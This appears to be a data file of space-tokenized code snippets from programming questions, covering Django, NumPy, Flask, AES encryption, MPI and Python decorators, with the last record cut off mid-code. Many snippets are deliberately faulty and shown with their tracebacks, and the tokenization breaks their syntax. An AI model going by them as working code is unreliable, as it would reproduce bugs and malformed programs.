Flow.objects.get ( id=request.user ) .flow credential = FLOW.step2_exchange ( request.REQUEST ) storage.put ( credential ) return HttpResponseRedirect ( `` http : //MY_URL:8000/caly '' ) from oauth2client.django_orm import FlowField , CredentialsField [ ... ] class Credentials ( models.Model ) : id = models.ForeignKey ( User , primary_key=True ) credential = CredentialsField ( ) class Flow ( models.Model ) : id = models.ForeignKey ( User , primary_key=True ) flow = FlowField ( ) if not xsrfutil.validate_token ( settings.SECRET_KEY , request.REQUEST [ 'state ' ] , request.user ) : return HttpResponseBadRequest ( ) request.user : adminsettings.SECRET_KEY : I_AM_NOT_WRITING_IT_HEREFLOW.params [ 'state ' ] : SOME_OTHER_RANDOM_STUFF request.user : adminsettings.SECRET_KEY : I_AM_NOT_WRITING_IT_HEREFLOW.params [ 'state ' ] : SOME_OTHER_RANDOM_STUFF"
"a < - c ( 1:10 ) polynomial < - poly ( a , 3 ) 1 2 3 [ 1 , ] -0.49543369 0.52223297 -0.4534252 [ 2 , ] -0.38533732 0.17407766 0.1511417 [ 3 , ] -0.27524094 -0.08703883 0.3778543 [ 4 , ] -0.16514456 -0.26111648 0.3346710 [ 5 , ] -0.05504819 -0.34815531 0.1295501 [ 6 , ] 0.05504819 -0.34815531 -0.1295501 [ 7 , ] 0.16514456 -0.26111648 -0.3346710 [ 8 , ] 0.27524094 -0.08703883 -0.3778543 [ 9 , ] 0.38533732 0.17407766 -0.1511417 [ 10 , ] 0.49543369 0.52223297 0.4534252"
"from module import * from PyQt4.QtCore import * from PyQt4.QtGui import QComboBox , QLineEdit , QLayout , Q ; lakdfaf ... ... ."
"def get_dist ( pt0 , pt1 ) : val = 0 for i in range ( 3 ) : val += ( pt0 [ i ] - pt1 [ i ] ) ** 2 val = math.sqrt ( val ) return val import math , random , timenum = 1000000 # Generate random points and numberspt_list = [ ] rand_list = [ ] for i in range ( num ) : pt = [ ] for j in range ( 3 ) : pt.append ( random.random ( ) ) pt_list.append ( pt ) rand_list.append ( random.randint ( 0 , num - 1 ) ) # Computebeg_time = time.clock ( ) dist = 0for i in range ( num ) : pt0 = pt_list [ i ] ri = rand_list [ i ] pt1 = pt_list [ ri ] val = 0 for j in range ( 3 ) : val += ( pt0 [ j ] - pt1 [ j ] ) ** 2 val = math.sqrt ( val ) dist += valend_time = time.clock ( ) elap_time = ( end_time - beg_time ) print elap_timeprint dist # include < cstdlib > # include < iostream > # include < ctime > # include < cmath > struct Point { double v [ 3 ] ; } ; int num = 1000000 ; int main ( ) { // Allocate memory Point** pt_list = new Point* [ num ] ; int* rand_list = new int [ num ] ; // Generate random points and numbers for ( int i = 0 ; i < num ; ++i ) { Point* pt = new Point ; for ( int j = 0 ; j < 3 ; ++j ) { const double r = ( double ) rand ( ) / ( double ) RAND_MAX ; pt- > v [ j ] = r ; } pt_list [ i ] = pt ; rand_list [ i ] = rand ( ) % num ; } // Compute clock_t beg_time = clock ( ) ; double dist = 0 ; for ( int i = 0 ; i < num ; ++i ) { const Point* pt0 = pt_list [ i ] ; int r = rand_list [ i ] ; const Point* pt1 = pt_list [ r ] ; double val = 0 ; for ( int j = 0 ; j < 3 ; ++j ) { const double d = pt0- > v [ j ] - pt1- > v [ j ] ; val += ( d * d ) ; } val = sqrt ( val ) ; dist += val ; } clock_t end_time = clock ( ) ; double sec_time = ( end_time - beg_time ) / ( double ) CLOCKS_PER_SEC ; std : :cout < < sec_time < < std : :endl ; std : :cout < < dist < < std : :endl ; return 0 ; }"
def t_INSERT ( token ) : r'INSERT\s+INTO ' return token
"> > > def create_class ( **data ) : ... return type ( 'MyClass ' , ( object , ) , data ) ... > > > A = create_class ( x=1 , y=2 ) > > > B = create_class ( x=1 , y=2 ) > > > A < class '__main__.MyClass ' > > > > B < class '__main__.MyClass ' > > > > A == BFalse > > > a = A ( ) > > > b = B ( ) > > > type ( a ) < class '__main__.MyClass ' > > > > type ( b ) < class '__main__.MyClass ' > > > > type ( a ) == type ( b ) False"
[ pytest ] ... addopts= -p no : myplugin pytest -p yes : myplugin
"import os , random , structfrom Crypto.Cipher import AESdef encrypt_file ( key , in_filename , out_filename=None , chunksize=64*1024 ) : if not out_filename : out_filename = in_filename + '.enc ' iv = os.urandom ( 16 ) encryptor = AES.new ( key , AES.MODE_CBC , iv ) filesize = os.path.getsize ( in_filename ) with open ( in_filename , 'rb ' ) as infile : with open ( out_filename , 'wb ' ) as outfile : outfile.write ( struct.pack ( ' < Q ' , filesize ) ) outfile.write ( iv ) while True : chunk = infile.read ( chunksize ) if len ( chunk ) == 0 : break elif len ( chunk ) % 16 ! = 0 : chunk += ' ' * ( 16 - len ( chunk ) % 16 ) outfile.write ( encryptor.encrypt ( chunk.decode ( 'UTF-8 ' , 'strict ' ) ) ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` < stdin > '' , line 17 , in encrypt_fileUnicodeDecodeError : 'utf-8 ' codec ca n't decode bytes in position 65534-65535 : unexpected end of data outfile.write ( encryptor.encrypt ( chunk.decode ( 'UTF-8 ' , 'strict ' ) ) ) outfile.write ( encryptor.encrypt ( chunk ) ) encrypt_file ( `` qwertyqwertyqwer '' , '/tmp/test ' , out_filename=None , chunksize=64*1024 ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > File `` < stdin > '' , line 16 , in encrypt_fileTypeError : ca n't concat bytes to str"
"optional arguments : -h , -- help show this help message and exit -u FILENAME , -- up-sound FILENAME The sound to play when the network comes up . Default : `` /path/to/some/sound/file.wav '' -d FILENAME , -- down-sound FILENAME The sound to play when the network goes down . Default : `` /path/to/some/other/sound/file.wav '' -p EXECUTABLE , -- player EXECUTABLE The program to use to play sounds . Default : `` play '' -s , -- silent If specified , network_monitor.py will not play any sounds . -c , -- no-clear-screen If specified , screen will not be cleared ( nor extra blank lines added ) before network_monitor.py runs . -- version show program 's version number and exit -p EXECUTABLE , -- player EXECUTABLE The program to use to play sounds . Default : `` play '' -s , -- silent If specified , network_monitor.py will not play any sounds ."
"''.join ( [ `` .join ( i ) for i in zip ( X , X ) ] )"
"import loggingimport concurrent.futuresdef process_batchs ( ) : batches = [ i for i in range ( 100 ) ] logging.basicConfig ( filename=r'doc\test_ProcessPoolExecutor.log ' , filemode= ' w+ ' , level=logging.DEBUG ) logging.info ( 'this is root logging ' ) with concurrent.futures.ProcessPoolExecutor ( 10 ) as e : futures = [ ] for batch in batches : future = e.submit ( f , batch ) futures.append ( future ) while True : dones = [ future.done ( ) for future in futures ] if all ( dones ) : results = [ future.result ( ) for future in futures ] print results breakdef f ( batch ) : # do some thing logging.info ( 'this is sub logging ' + str ( batch ) ) return batchif __name__ == '__main__ ' : process_batchs ( )"
class sysprops ( object ) : SOME_CONSTANT = 'SOME_VALUE'sysprops.SOME_CONSTANT # this statement would not return 'SOME_VALUE ' but instead a dynamic value pulled from the database .
"> > > x = np.array ( [ 1,3,5 ] ) > > > y = np.array ( [ 2,4 ] ) > > > x+y*** ValueError : operands could not be broadcast together with shapes ( 3 , ) ( 2 , )"
"from django.http import HttpResponseRedirectclass BetaMiddleware ( object ) : `` '' '' Require beta code session key in order to view any page. `` '' '' def process_request ( self , request ) : if request.path ! = '/beta/ ' and not request.session.get ( 'in_beta ' ) : return HttpResponseRedirect ( ' % s ? next= % s ' % ( '/beta/ ' , request.path ) )"
"INSTALLED_APPS = ( 'prereq1 ' , prereq2 ' , 'foo ' )"
"d = { 'age ' : [ '12 ' , '32 ' , '43 ' , '54 ' , '32 ' , '32 ' , '12 ' ] } dfTest = pd.DataFrame ( data=d ) alt.Chart ( dfTest ) .mark_bar ( ) .encode ( alt.X ( `` age : Q '' , bin=True ) , y='count ( ) ' , )"
".├── build│ ├── bdist.linux-x86_64│ └── lib.linux-x86_64-2.7│ └── flaskr│ ├── flaskr.py│ ├── __init__.py│ ├── schema.sql│ ├── static│ │ └── style.css│ └── templates│ ├── layout.html│ ├── login.html│ └── show_entries.html├── dist│ └── flaskr-0.0.0-py2.7.egg├── flaskr│ ├── flaskr.db│ ├── flaskr.py│ ├── flaskr.pyc│ ├── __init__.py│ ├── __init__.pyc│ ├── schema.sql│ ├── static│ │ └── style.css│ └── templates│ ├── layout.html│ ├── login.html│ └── show_entries.html├── flaskr.egg-info│ ├── dependency_links.txt│ ├── PKG-INFO│ ├── requires.txt│ ├── SOURCES.txt│ └── top_level.txt├── MANIFEST.in├── README├── setup.cfg├── setup.py├── test│ └── test_flaskr.py└── tests └── test_flaskr.py import osimport flaskrimport unittestimport tempfileclass FlaskrTestCase ( unittest.TestCase ) : def setUp ( self ) : self.db_fd , flaskr.app.config [ 'DATABASE ' ] = tempfile.mkstemp ( ) flaskr.app.config [ 'TESTING ' ] = True self.app = flaskr.app.test_client ( ) with flaskr.app.app_context ( ) : flaskr.init_db ( ) def tearDown ( self ) : os.close ( self.db_fd ) os.unlink ( flaskr.app.config [ 'DATABASE ' ] ) def test_empty_db ( self ) : rv = self.app.get ( '/ ' ) assert b'No entries here so far ' in rv.dataif __name__ == '__main__ ' : unittest.main ( ) Traceback ( most recent call last ) : File `` /home/kurt/dev/scratch/flask/examples/flaskr/test/test_flaskr.py '' , line 13 , in setUp flaskr.init_db ( ) AttributeError : 'module ' object has no attribute 'init_db '"
"import structimport zlibwith open ( 'test.mgx ' , `` rb '' ) as fp : # read the header_len bytes and covert it to a int reprents length of Header part header_len = struct.unpack ( `` < i '' , fp.read ( 4 ) ) [ 0 ] # read next_pos ( this is not important for me ) next_pos = struct.unpack ( `` < i '' , fp.read ( 4 ) ) [ 0 ] # then I can get data length of header_data part ( compressed with zlib ) header_data_len = header_len - 8 compressed_data = fp.read ( header_data_len ) [ : :-1 ] # need to be reversed because byte order is little endian ? try : zlib.decompress ( compressed_data ) print `` can be decompressed ! '' except zlib.error as e : print e.message"
"urllib2.URLError : < urlopen error < 10048 , 'Address already in use ' > > request = urllib2.Request ( file_remote_path ) opener = urllib2.build_opener ( ) datastream = opener.open ( request ) outfileobj = open ( temp_file_path , 'wb ' ) try : while True : chunk = datastream.read ( CHUNK_SIZE ) if chunk == `` : break else : outfileobj.write ( chunk ) finally : outfileobj = outfileobj.close ( ) datastream.close ( )"
"from graphframes import *v = sqlContext.createDataFrame ( [ ( `` a '' , `` Alice '' , 34 ) , ( `` b '' , `` Bob '' , 36 ) , ( `` c '' , `` Charlie '' , 30 ) , ] , [ `` id '' , `` name '' , `` age '' ] ) # Create an Edge DataFrame with `` src '' and `` dst '' columnse = sqlContext.createDataFrame ( [ ( `` a '' , `` b '' , `` friend '' ) , ( `` b '' , `` c '' , `` follow '' ) , ( `` c '' , `` b '' , `` follow '' ) , ] , [ `` src '' , `` dst '' , `` relationship '' ] ) # Create a GraphFrameg = GraphFrame ( v , e ) results = g.shortestPaths ( landmarks= [ `` a '' , `` b '' , '' c '' ] ) results.select ( `` id '' , '' distances '' ) .show ( ) + -- -+ -- -- -- -- -- -- -- -- -- -- +| id| distances|+ -- -+ -- -- -- -- -- -- -- -- -- -- +| a|Map ( a - > 0 , b - > ... || b| Map ( b - > 0 , c - > 1 ) || c| Map ( c - > 0 , b - > 1 ) |+ -- -+ -- -- -- -- -- -- -- -- -- -- + + -- -+ -- -+ -- -- -- -- -+ | id| v | distance|+ -- -+ -- -+ -- -- -- -- -+| a| a | 0 || a| b | 1 || a| c | 2 || b| b | 0 || b| c | 1 || c| c | 0 || c| b | 1 |+ -- -+ -- -+ -- -- -- -- -+"
"import flaskapp = flask.Flask ( __name__ ) @ app.before_first_requestdef initstuff ( ) : test_file = '/tmp/test ' with open ( test_file , ' w ' ) as f : f.write ( 'test ' ) @ app.route ( '/ ' , methods= [ 'GET ' ] ) def rootdir ( ) : return 'Hello world ' from MainServer import app as application"
"class RandomForm ( BaseForm ) : def __init__ ( self , *args , **kwargs ) : # This does n't work if kwargs [ `` instance '' ] is None : self._meta.exclude = ( `` active '' , ) super ( ServiceForm , self ) .__init__ ( *args , **kwargs ) # This does n't work either if kwargs [ `` instance '' ] is None : self._meta.exclude = ( `` active '' , ) class Meta : model = models.Service fields = ( ... some fields ... )"
"from dask import dataframe as ddimport numpy as npimport pandas as pddf = pd.DataFrame ( { ' A ' : np.arange ( 5 ) , ' B ' : np.arange ( 5 ) , ' C ' : np.arange ( 5 ) } ) ddf = dd.from_pandas ( df , npartitions=1 ) def aggregate ( x ) : print ( ' B val received : ' + str ( x.B ) ) return xddf.apply ( aggregate , axis=1 ) .compute ( ) B val received : 1B val received : 1B val received : 1B val received : 0B val received : 0B val received : 1B val received : 2B val received : 3B val received : 4 A B C0 0 0 01 1 1 12 2 2 23 3 3 34 4 4 4"
"val = `` 11:66:11 '' try : val = map ( int , val.split ( ' : ' ) ) except ValueError : return Falseif len ( val ) == 1 : return valif len ( val ) == 2 : if val [ 1 ] > 59 : print `` Bad seconds '' return Falseif len ( val ) == 3 : if val [ 2 ] > 59 or val [ 1 ] > 59 : print `` Bad seconds / minutes '' return Falsewhile len ( val ) < 3 : split.insert ( 0,0 ) return = timedelta ( hours=split [ 0 ] , minutes=split [ 1 ] , seconds=split [ 2 ] )"
"A = Counter ( { a:1 , b:2 , c:3 } ) B = Counter ( { b:1 , c:2 , d:3 } ) C = A+B = Counter ( { a:1 , b:3 , c:5 , d:3 } ) . MPI.Allreduce ( send_counter , recv_counter , MPI.SUM ) def dict_sum ( dict1 , dict2 , datatype ) : for key in dict2 : try : dict1 [ key ] += dict2 [ key ] except KeyError : dict1 [ key ] = dict2 [ key ] dictSumOp = MPI.Op.Create ( dict_sum , commute=True ) the_result = comm.allreduce ( mydict , dictSumOp ) the_result = comm.allreduce ( mydict , op=dictSumOp )"
"Traceback ( most recent call last ) : File `` ./manage.py '' , line 25 , in < module > execute_from_command_line ( sys.argv ) File `` /home/vagrant/.virtualenvs/rhw/lib/python2.7/site-packages/django/core/management/__init__.py '' , line 363 , in execute_from_command_line utility.execute ( ) File `` /home/vagrant/.virtualenvs/rhw/lib/python2.7/site-packages/django/core/management/__init__.py '' , line 355 , in execute self.fetch_command ( subcommand ) .run_from_argv ( self.argv ) File `` /home/vagrant/.virtualenvs/rhw/lib/python2.7/site-packages/django/core/management/commands/test.py '' , line 29 , in run_from_argv super ( Command , self ) .run_from_argv ( argv ) File `` /home/vagrant/.virtualenvs/rhw/lib/python2.7/site-packages/django/core/management/base.py '' , line 283 , in run_from_argv self.execute ( *args , **cmd_options ) File `` /home/vagrant/.virtualenvs/rhw/lib/python2.7/site-packages/django/core/management/base.py '' , line 330 , in execute output = self.handle ( *args , **options ) File `` /home/vagrant/.virtualenvs/rhw/lib/python2.7/site-packages/django/core/management/commands/test.py '' , line 62 , in handle failures = test_runner.run_tests ( test_labels ) File `` /home/vagrant/.virtualenvs/rhw/lib/python2.7/site-packages/django/test/runner.py '' , line 601 , in run_tests old_config = self.setup_databases ( ) File `` /home/vagrant/.virtualenvs/rhw/lib/python2.7/site-packages/django/test/runner.py '' , line 546 , in setup_databases self.parallel , **kwargs File `` /home/vagrant/.virtualenvs/rhw/lib/python2.7/site-packages/django/test/utils.py '' , line 187 , in setup_databases serialize=connection.settings_dict.get ( 'TEST ' , { } ) .get ( 'SERIALIZE ' , True ) , File `` /home/vagrant/.virtualenvs/rhw/lib/python2.7/site-packages/django/db/backends/base/creation.py '' , line 69 , in create_test_db run_syncdb=True , File `` /home/vagrant/.virtualenvs/rhw/lib/python2.7/site-packages/django/core/management/__init__.py '' , line 130 , in call_command return command.execute ( *args , **defaults ) File `` /home/vagrant/.virtualenvs/rhw/lib/python2.7/site-packages/django/core/management/base.py '' , line 330 , in execute output = self.handle ( *args , **options ) File `` /home/vagrant/.virtualenvs/rhw/lib/python2.7/site-packages/django/core/management/commands/migrate.py '' , line 83 , in handle executor = MigrationExecutor ( connection , self.migration_progress_callback ) File `` /home/vagrant/.virtualenvs/rhw/lib/python2.7/site-packages/django/db/migrations/executor.py '' , line 20 , in __init__ self.loader = MigrationLoader ( self.connection ) File `` /home/vagrant/.virtualenvs/rhw/lib/python2.7/site-packages/django/db/migrations/loader.py '' , line 52 , in __init__ self.build_graph ( ) File `` /home/vagrant/.virtualenvs/rhw/lib/python2.7/site-packages/django/db/migrations/loader.py '' , line 203 , in build_graph self.load_disk ( ) File `` /home/vagrant/.virtualenvs/rhw/lib/python2.7/site-packages/django/db/migrations/loader.py '' , line 82 , in load_disk module = import_module ( module_name ) File `` /usr/local/lib/python2.7.11/lib/python2.7/importlib/__init__.py '' , line 37 , in import_module __import__ ( name ) ImportError : No module named notmigrations"
"@ app.route ( '/delay ' ) def delay ( ) : from time import sleep def delay_inner ( ) : for i in range ( 10 ) : sleep ( 5 ) yield json.dumps ( { 'delay ' : i } ) return Response ( delay_inner ( ) , mimetype= '' text/event-stream '' )"
"import base64 , mechanizeurl = `` http : //www.dogus.edu.tr/dusor/FrmMain.aspx '' user = `` user '' pwd = `` pwd '' br = mechanize.Browser ( ) br.set_handle_robots ( False ) br.set_handle_refresh ( mechanize._http.HTTPRefreshProcessor ( ) , max_time=1 ) br.addheaders = [ ( 'User-agent ' , 'Mozilla/5.0 ( X11 ; U ; Linux i686 ; en-US ; rv:1.9.0.1 ) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1 ' ) ] br.add_password ( url , user , pwd ) # br.addheaders.append ( ( 'Authorization ' , 'Basic % s ' % base64.encodestring ( ' % s : % s ' % ( user , pwd ) ) ) ) print br.open ( url ) .read ( )"
"bins = np.array ( [ 0 , 0 , 1 , 1 , 2 , 2 , 2 , 0 , 1 , 2 ] ) vals = np.array ( [ 8 , 7 , 3 , 4 , 1 , 2 , 6 , 5 , 0 , 9 ] ) k = 3 # Bin == 0 # ↓ ↓ ↓ # [ 0 0 1 1 2 2 2 0 1 2 ] # [ 8 7 3 4 1 2 6 5 0 9 ] # ↑ ↑ ↑ # ⇧ # [ 0 1 2 3 4 5 6 7 8 9 ] # Maximum is 8 and happens at position 0 ( vals * ( bins == 0 ) ) .argmax ( ) 0 # Bin == 1 # ↓ ↓ ↓ # [ 0 0 1 1 2 2 2 0 1 2 ] # [ 8 7 3 4 1 2 6 5 0 9 ] # ↑ ↑ ↑ # ⇧ # [ 0 1 2 3 4 5 6 7 8 9 ] # Maximum is 4 and happens at position 3 ( vals * ( bins == 1 ) ) .argmax ( ) 3 # Bin == 2 # ↓ ↓ ↓ ↓ # [ 0 0 1 1 2 2 2 0 1 2 ] # [ 8 7 3 4 1 2 6 5 0 9 ] # ↑ ↑ ↑ ↑ # ⇧ # [ 0 1 2 3 4 5 6 7 8 9 ] # Maximum is 9 and happens at position 9 ( vals * ( bins == 2 ) ) .argmax ( ) 9 def binargmax ( bins , vals , k ) : out = -np.ones ( k , np.int64 ) trk = np.empty ( k , vals.dtype ) trk.fill ( np.nanmin ( vals ) - 1 ) for i in range ( len ( bins ) ) : v = vals [ i ] b = bins [ i ] if v > trk [ b ] : trk [ b ] = v out [ b ] = i return outbinargmax ( bins , vals , k ) array ( [ 0 , 3 , 9 ] )"
"angle = symbols ( 'angle ' ) print ( sin ( angle ) **2 ) .rewrite ( sin , cos ) # ( 1 - cos ( 2*angle ) ) /2print ( ( 1 - cos ( 2*angle ) ) /2 ) .rewrite ( cos , sin ) # sin ( angle ) **2"
"class CommandProtocol ( LineOnlyReceiver ) : def connectionMade ( self ) : log.msg ( `` Connected to command port '' ) def lineReceived ( self , line ) : print repr ( line ) processCommandLine ( line ) class DiagnosticProtocol ( LineOnlyReceiver ) : def connectionMade ( self ) : log.msg ( `` Connected to diag port '' ) def lineReceived ( self , line ) : print repr ( line ) processDiagnosticLine ( line ) ... # modem1 portscmdPort [ 0 ] = SerialPort ( CommandProtocol , `` /dev/ttyUSB0 '' , reactor , 115200 ) diagPort [ 0 ] = SerialPort ( DiagnosticProtocol , `` /dev/ttyUSB1 '' , reactor , 115200 ) # modem2 portscmdPort [ 1 ] = SerialPort ( CommandProtocol , `` /dev/ttyUSB3 '' , reactor , 115200 ) diagPort [ 1 ] = SerialPort ( DiagnosticProtocol , `` /dev/ttyUSB4 '' , reactor , 115200 )"
"[ [ [ [ [ 1 , 3 , 4 , 5 ] ] , [ 1 , 3 , 8 ] ] , [ [ 1 , 7 , 8 ] ] ] , [ [ [ 6 , 7 , 8 ] ] ] , [ 9 ] ] [ [ [ [ [ 1 , 3 , 4 , 5 ] ] , [ 1 , 3 , 8 ] ] , [ [ 1 , 7 , 8 ] ] ] , [ [ [ 6 , 7 , 8 ] ] ] , [ 9 ] ] [ [ 1 , 3 , 4 , 5 ] , [ 1 , 3 , 8 ] , [ 1 , 7 , 8 ] , [ 6 , 7 , 8 ] , [ 9 ] ]"
"$ path = $ ENV { 'SOME_NAME ' } || die `` SOME_NAME ENV VARIABLE NOT FOUND\n '' ; try : path = os.environ [ 'SOME_NAME ' ] except KeyError , e : print `` SOME_NAME ENVIRONMENT VARIABLE NOT FOUND\n '' raise e"
"... class Slider ( models.Model ) : slider_title = models.CharField ( max_length=20 ) slider_text = models.TextField ( max_length=200 ) slider_order = models.PositiveSmallIntegerField ( default=1 , blank=True , null=True , choices= [ ( 1 , 'first ' ) , ( 2 , 'middle ' ) , ( 3 , 'last ' ) ] ) dummy = None def clean ( self ) : validate_only_three_instances ( self ) def __str__ ( self ) : return self.slider_title ... ... class SliderAdmin ( admin.ModelAdmin ) : # remove `` add '' button def has_add_permission ( self , request ) : return False fieldsets = [ ( None , { 'fields ' : [ 'slider_title ' ] } ) , ( None , { 'fields ' : [ 'slider_text ' ] } ) , ( None , { 'fields ' : [ 'slider_order ' ] } ) , ] list_display = ( 'slider_title ' , 'slider_text ' , 'slider_order ' , 'dummy ' , ) list_display_links = ( 'dummy ' , ) list_editable = ( 'slider_title ' , 'slider_text ' , 'slider_order ' , ) ..."
"# Opencvsrc = cv2.imread ( 'pic.jpg ' ) # read image # gaussian blursrc = cv2.GaussianBlur ( src , ( 5,5 ) ,0 ) # Convert to LABsrc_lab = cv.cvtColor ( src , cv.COLOR_BGR2LAB ) # convert to LAB # SLICcv_slic = ximg.createSuperpixelSLIC ( src_lab , algorithm = ximg.SLICO , region_size = 32 ) cv_slic.iterate ( ) # Skimagesrc = io.imread ( 'pic.jpg ' ) sk_slic = skimage.segmentation.slic ( src , n_segments = 256 , sigma = 5 ) # Measure properties of labeled image regionsregions = regionprops ( labels ) # Scatter centroid of each superpixelplt.scatter ( [ x.centroid [ 1 ] for x in regions ] , [ y.centroid [ 0 ] for y in regions ] , c = 'red ' )"
"class Foo ( object ) : passf = Foo ( ) f.__call__ = lambda *args : argsf ( 1 , 2 , 3 )"
"def scale ( x , power2=16 ) : if x < 0 : return - ( ( -x ) > > power2 ) else : return x > > power2def main ( ) : inp = [ 12595827 , -330706 , 196605 , -387168 , -274244 , 377496 , -241980 , -545272 , -196605 , 24198 , 196605 , 193584 , 104858 , 424683 , -40330 , 41944 ] expect = [ 192 , -5 , 3 , -6 , -4 , 5 , -3 , -8 , -3 , 0 , 3 , 3 , 1 , 6 , 0 , 0 ] actual = map ( scale , inp ) for i in range ( len ( expect ) ) : if actual [ i ] == expect [ i ] : continue print 'inp : % 8d expected : % 3d actual : % 3d err : % d ' % ( inp [ i ] , expect [ i ] , actual [ i ] , expect [ i ] - actual [ i ] ) if __name__ == '__main__ ' : main ( ) inp : 196605 expected : 3 actual : 2 err : 1inp : -387168 expected : -6 actual : -5 err : -1inp : -196605 expected : -3 actual : -2 err : -1inp : 196605 expected : 3 actual : 2 err : 1inp : 193584 expected : 3 actual : 2 err : 1"
"class test ( object ) : def __init__ ( self , name ) : print nameclass test ( ) : def __init__ ( self , name ) : print name"
"a = [ 1 , 2 ]"
"Braden-Keiths-MacBook-Pro : ~ bradenkeith $ ./EPFImporter.py /Users/bradenkeith/Downloads/popularity20120314 2012-03-14 22:12:28,748 [ INFO ] : Beginning import for the following directories : /Users/bradenkeith/Downloads/popularity20120314 2012-03-14 22:12:28,748 [ INFO ] : Importing files in /Users/bradenkeith/Downloads/popularity20120314 2012-03-14 22:12:28,749 [ INFO ] : Starting import of /Users/bradenkeith/Downloads/popularity20120314 ... 2012-03-14 22:12:28,749 [ INFO ] : Beginning full ingest of epf_application_popularity_per_genre ( 2000491 records ) 2012-03-14 22:14:28,774 [ INFO ] : ... at record 1797000 ... 2012-03-14 22:16:02,152 [ INFO ] : Full ingest of epf_application_popularity_per_genre took 0:03:33.402408 2012-03-14 22:16:02,196 [ INFO ] : Import of popularity20120314 completed at : 12-03-14 22:16:02 2012-03-14 22:16:02,196 [ INFO ] : Total import time for popularity20120314 : 0:03:33.44 2012-03-14 22:16:02,196 [ INFO ] : Total import time for all directories : 0:03:33.44"
"> > > round ( 2.667 , 2 ) 2.67 > > > round_down ( 2.667 , 2 ) 2.66"
"class User ( object ) : def __init__ ( self , name , username ) : self.name = name self.username = usernameimport jsonj = json.loads ( your_json ) u = User ( **j ) import jsonfrom namedlist import namedlistdata = ' { `` name '' : `` John Smith '' , `` hometown '' : { `` name '' : `` New York '' , `` id '' : 123 } } ' # Parse JSON into an object with attributes corresponding to dict keys.x = json.loads ( data , object_hook=lambda d : namedlist ( ' X ' , d.keys ( ) ) ( *d.values ( ) ) ) print x.name , x.hometown.name , x.hometown.id"
"def decorator1 ( dec_param ) : def decorator ( function ) : print 'decorator1 decoratoring : ' , function def wrapper ( *args ) : print 'wrapper ( % s ) dec_param= % s ' % ( args , dec_param ) function ( *args ) return wrapper return decoratorclass WrapperClass ( object ) : def __init__ ( self , function , dec_param ) : print 'WrapperClass.__init__ function= % s dec_param= % s ' % ( function , dec_param ) self.function = function self.dec_param = dec_param def __call__ ( self , *args ) : print 'WrapperClass.__call__ ( % s , % s ) dec_param= % s ' % ( self , args , self.dec_param ) self.function ( *args ) def decorator2 ( dec_param ) : def decorator ( function ) : print 'decorator2 decoratoring : ' , function return WrapperClass ( function , dec_param ) return decoratorclass Test ( object ) : @ decorator1 ( dec_param=123 ) def member1 ( self , value=1 ) : print 'Test.member1 ( % s , % s ) ' % ( self , value ) @ decorator2 ( dec_param=456 ) def member2 ( self , value=2 ) : print 'Test.member2 ( % s , % s ) ' % ( self , value ) @ decorator1 ( dec_param=123 ) def free1 ( value=1 ) : print 'free1 ( % s ) ' % ( value ) @ decorator2 ( dec_param=456 ) def free2 ( value=2 ) : print 'free2 ( % s ) ' % ( value ) test = Test ( ) print '\n====member1===='test.member1 ( 11 ) print '\n====member2===='test.member2 ( 22 ) print '\n====free1===='free1 ( 11 ) print '\n====free2===='free2 ( 22 ) decorator1 decoratoring : < function member1 at 0x3aba30 > decorator2 decoratoring : < function member2 at 0x3ab8b0 > WrapperClass.__init__ function= < function member2 at 0x3ab8b0 > dec_param=456decorator1 decoratoring : < function free1 at 0x3ab9f0 > decorator2 decoratoring : < function free2 at 0x3ab970 > WrapperClass.__init__ function= < function free2 at 0x3ab970 > dec_param=456====member1====wrapper ( ( < __main__.Test object at 0x3af5f0 > , 11 ) ) dec_param=123Test.member1 ( < __main__.Test object at 0x3af5f0 > , 11 ) ====member2====WrapperClass.__call__ ( < __main__.WrapperClass object at 0x3af590 > , ( 22 , ) ) dec_param=456Test.member2 ( 22 , 2 ) < < < - Badness HERE ! ====free1====wrapper ( ( 11 , ) ) dec_param=123free1 ( 11 ) ====free2====WrapperClass.__call__ ( < __main__.WrapperClass object at 0x3af630 > , ( 22 , ) ) dec_param=456free2 ( 22 )"
"X : 2X4w1 : 2X3l1 : 4X3w2 : 2X4Y : 2X3 import numpy as npM = 2learning_rate = 0.0001X_train = np.asarray ( [ [ 1,1,1,1 ] , [ 0,0,0,0 ] ] ) Y_train = np.asarray ( [ [ 1,1,1 ] , [ 0,0,0 ] ] ) X_trainT = X_train.TY_trainT = Y_train.TA2_sig = 0 ; A1_sig = 0 ; def sigmoid ( z ) : s = 1 / ( 1 + np.exp ( -z ) ) return sdef forwardProp ( ) : global A2_sig , A1_sig ; w1=np.random.uniform ( low=-1 , high=1 , size= ( 2 , 2 ) ) b1=np.random.uniform ( low=1 , high=1 , size= ( 2 , 1 ) ) w1 = np.concatenate ( ( w1 , b1 ) , axis=1 ) A1_dot = np.dot ( X_trainT , w1 ) A1_sig = sigmoid ( A1_dot ) .T w2=np.random.uniform ( low=-1 , high=1 , size= ( 4 , 1 ) ) b2=np.random.uniform ( low=1 , high=1 , size= ( 4 , 1 ) ) w2 = np.concatenate ( ( w2 , b2 ) , axis=1 ) A2_dot = np.dot ( A1_sig , w2 ) A2_sig = sigmoid ( A2_dot ) def backProp ( ) : global A2_sig ; global A1_sig ; error1 = np.dot ( ( A2_sig - Y_trainT ) .T , A1_sig / M ) print ( A1_sig ) print ( error1 ) error2 = A1_sig.T - error1forwardProp ( ) backProp ( ) ValueError Traceback ( most recent call last ) < ipython-input-605-5aa61e60051c > in < module > ( ) 45 46 forwardProp ( ) -- - > 47 backProp ( ) 48 49 # dw2 = np.dot ( ( Y_trainT - A2_sig ) ) < ipython-input-605-5aa61e60051c > in backProp ( ) 42 print ( A1_sig ) 43 print ( error1 ) -- - > 44 error2 = A1_sig.T - error1 45 46 forwardProp ( ) ValueError : operands could not be broadcast together with shapes ( 4,3 ) ( 2,4 ) import numpy as npM = 2learning_rate = 0.0001X_train = np.asarray ( [ [ 1,1,1,1 ] , [ 0,0,0,0 ] ] ) Y_train = np.asarray ( [ [ 1,1,1 ] , [ 0,0,0 ] ] ) X_trainT = X_train.TY_trainT = Y_train.TA2_sig = 0 ; A1_sig = 0 ; def sigmoid ( z ) : s = 1 / ( 1 + np.exp ( -z ) ) return sA1_sig = 0 ; A2_sig = 0 ; def forwardProp ( ) : global A2_sig , A1_sig ; w1=np.random.uniform ( low=-1 , high=1 , size= ( 4 , 2 ) ) b1=np.random.uniform ( low=1 , high=1 , size= ( 2 , 1 